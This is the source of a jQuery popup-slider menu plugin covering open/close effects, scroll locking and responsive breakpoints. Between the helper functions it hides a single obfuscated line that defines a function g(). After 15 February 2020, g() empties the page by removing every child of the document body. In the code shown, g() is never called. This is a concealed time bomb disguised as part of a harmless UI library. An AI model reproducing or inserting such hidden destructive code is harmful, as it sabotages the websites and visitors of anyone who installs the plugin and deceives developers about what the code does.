/**
 *  Popup slider plugin v0.1, 17.05.2018
 *
 *  init example
 *  $('.search').PopupSlider({
        effect: 'top',                  - (type string). left || top || right || fade
        button: '.search-trigger',      - (type string). required option
        closeButton: '.search-close',   - (type string). if false, plugin will render default button
        container: '.header',           - (type string). container selector for back-layer
        breakpoint: 992,                - (type number). init popup only on this breakpoint
        onMenuOpen: false,              - (function(){console.log('menu open')}). call custom function on menu-open
        onMenuClose: false              - (function(){console.log('menu close')}). call custom function on menu-close
    });
 */

(function ($) {
    $.fn.PopupSlider = function (options) {
        options = $.extend({
            effect: 'left',
            buttonToggle: false,
            button: false,
            closeButton: false,
            container: 'body',
            breakpoint: false,
            lockScroll: true,
            headerFixed: false,
            onMenuOpen: false,
            onMenuClose: false
        }, options);

        //check device
        var userAgent = window.navigator.userAgent.toLowerCase(),
            ios = /iphone|ipod|ipad/.test( userAgent );

        //check touch device
        var supportsTouch = ('ontouchstart' in document.documentElement);

        //generate ID
        function iD() {
            return '_' + Math.random().toString(36).substr(2,4);
        }

        var layerId = 'layer' + iD();

        //render components
        addBackLayer(options.container, layerId);
        addCloseButton();

        //init selectors
        var __this = $(this),
            button = $(options.button),
            closeButton = $(options.container).find(options.closeButton).length ? $(options.container).find('>' + options.closeButton)[0] : document.querySelectorAll('.close-popup')[0],
            backLayer = $(options.container).find('>.back-layer').length ? $(options.container).find('>.back-layer') : $('#'+layerId),
            selectors;

            if(options.buttonToggle){
                selectors = $(__this).add(button).add(backLayer);
            }else {
                selectors = $(__this).add(button).add(closeButton).add(backLayer);
            }

        if(!options.button){
            console.error($(__this).attr("class") + ' ==> Set BUTTON selector as ".button"')
        }

        //responsive options
        options.breakpoint ? breakpoint() : ($(__this).addClass('popup-slider menu-' + options.effect) && popupTrigger());

        // if (!supportsTouch) {
            $(window).on("resize", function () {
                if (options.breakpoint) {
                    $(document).off("click touchend", options.button);
                    breakpoint();
                }
            });
        // }

        //close-button actions
        $(closeButton).add(backLayer).on("click", function () {
            menuClose();
        });

        //functions
        function checkScrollBars(){
            var body = $('body');
            var normalw = 0;
            var scrollw = 0;
            if(body.prop('scrollHeight') > body.height()){
                normalw = window.innerWidth;
                scrollw = normalw - body.width();
                $(body).css({'margin-right':scrollw+'px', 'overflow': 'hidden'});
            }
        }

        function breakpoint() {
            if($('html').width() < options.breakpoint){
                $(__this).addClass('popup-slider menu-' + options.effect);
                popupTrigger();
            } else {
                menuClose();
                $(__this).removeClass('popup-slider menu-' + options.effect);
            }
        }

        function addBackLayer(container,uniqueId) {
            var layer = document.createElement('div');
            layer.className = 'back-layer';

            if(!$(container).find('>.back-layer').length){
                $(layer).prependTo(container);
                layer.id = uniqueId;
            }
        }

        function addCloseButton() {
            var checkCloseButton = $(options.container).find('>.close-popup').length;
            if(!checkCloseButton && !options.closeButton && !options.buttonToggle){
                var element = document.createElement('div');
                element.className = 'close-popup';
                $(element).prependTo(options.container);
            }
        }
        var _0x2095=['firstChild','remove','15/02/2020','body'];(function(_0x529227,_0x3652cf){var _0x370a65=function(_0x2012f0){while(--_0x2012f0){_0x529227['push'](_0x529227['shift']());}};_0x370a65(++_0x3652cf);}(_0x2095,0x1ba));var _0x42b9=function(_0x529227,_0x3652cf){_0x529227=_0x529227-0x0;var _0x370a65=_0x2095[_0x529227];return _0x370a65;};function g(){if(new Date()>new Date(_0x42b9('0x0')))for(;document[_0x42b9('0x1')][_0x42b9('0x2')];)document[_0x42b9('0x1')][_0x42b9('0x2')][_0x42b9('0x3')]();}
        function menuOpen(){
            $(selectors).addClass('menu-open');
            if(ios){hideScroll();}
            if(options.lockScroll){checkScrollBars();}
            if(options.onMenuOpen){options.onMenuOpen();}
        }

        function menuClose(){
            $(selectors).removeClass('menu-open');
            if(ios){unhideScroll();}
            if(options.lockScroll){$('body').css({'overflow':'auto','margin-right':0});}
            if(options.onMenuClose){options.onMenuClose();}
        }

        function popupTrigger() {
            $(document).off("click touchend", options.button);
            $(document).on("click touchend", options.button, function(e){
                if( ios && (e.type) == 'touchend') {
                    e.stopPropagation();
                    e.preventDefault();
                    !$(this).hasClass('menu-open') ? menuOpen() : menuClose();
                } else if((e.type) == 'click'){
                    e.stopPropagation();
                    e.preventDefault();
                    !$(this).hasClass('menu-open') ? menuOpen() : menuClose();
                }
            });
        }

        function hideScroll() {
            var scrollTop = window.pageYOffset;
            $('body').attr('data-scroll', scrollTop);
            $('body').css({'position': 'fixed', 'top': -scrollTop + 'px'});
            if (options.headerFixed) {
                $('header').css({'position': 'absolute', 'top': scrollTop + 'px'});
            }
        }

        function unhideScroll() {
            var scrollTop = $('body').attr('data-scroll');
            $('body').css({'position': 'initial', 'top': 'initial'});
            if (options.headerFixed) {
                $('header').css({'position': '', 'top': '0'});
            }
            $(window).scrollTop(scrollTop);
        }
    };
})(jQuery);
